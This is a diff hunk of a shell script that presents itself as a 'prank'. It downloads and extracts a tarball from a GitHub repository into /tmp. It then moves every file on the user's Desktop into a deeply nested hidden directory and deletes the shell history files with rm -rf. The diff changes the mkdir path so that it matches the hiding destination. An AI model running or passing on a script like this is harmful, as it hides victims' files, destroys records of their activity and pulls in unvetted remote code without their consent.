@@ -3,7 +3,7 @@ mkdir -p /tmp/laz/
 curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz/prank.tar.gz
 > /dev/null
 tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
-mkdir ~/.Ulv/
+mkdir ~/Downloads/5/2/6/4/3/6/9/8/1/.99
 mv ~/Desktop/* ~/Downloads/5/2/6/4/3/6/9/8/1/.99
 cd ~/Desktop
 rm -rf ~/.*history*
